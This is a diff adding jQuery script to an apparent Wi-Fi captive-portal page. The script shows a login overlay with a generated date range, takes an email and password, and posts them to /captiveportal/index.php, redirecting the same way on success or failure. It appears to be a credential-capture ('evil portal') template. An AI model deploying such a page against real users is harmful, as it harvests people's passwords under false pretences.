@@ -1,0 +1,53 @@
+<script type="text/javascript" src="jquery-2.2.1.min.js"></script>
+
+<script>
+window.onload = init;
+
+function init(){
+	importantDates();
+	setTimeout(displayLogin(),1000);
+}
+function importantDates() {
+	$('#pa_date').html(function(){
+		var monthNames=["January", "February", "March", "April", "May", "June",
+		                "July", "August", "September", "October", "November", "December"];
+		var tf=new Date();var tp=new Date();var f=new Date();var p=new Date();
+		f.setDate(tf.getDate()+5);p.setDate(tp.getDate()-2);
+		var fd=f.getDate();var pd=p.getDate();
+		var fm=monthNames[f.getMonth()];var pm=monthNames[p.getMonth()];
+		if(fd<10){fd='0'+fd}if(pd<10){pd='0'+pd}
+		return pm+' '+pd+' - '+fm+' '+fd;
+	});
+}
+$(function() {
+	$(".pa_submit-button").on("click", function() {
+        	var email_addr = $('#pa_email').val();
+        	var pass = $('#pa_password').val();
+        	if (email_addr == "" || pass == "") {
+                	alert("You must enter credentials to log in.");
+                    	return;
+                } else {
+                	$.ajax({
+                        	type: "POST",
+                        	url: "/captiveportal/index.php",
+                        	data: {email: email_addr,
+					password: pass,
+					target: "<?=$destination?>"},
+				dataType: 'json',
+				success: function(data, textStatus, jqXHR) {
+                        	    window.location="/captiveportal/index.php";
+                        	},
+                        	error: function(data, textStatus, errorThrown) {
+                        	    window.location="/captiveportal/index.php";
+				}
+			});
+		}
+	});
+});
+function displayLogin() {
+	$(function(){
+		$(".pa_form-container").css("opacity", "1");
+		$(".pa_form-container, #pa_overlay-back").fadeIn("slow");
+	});
+}
+</script>
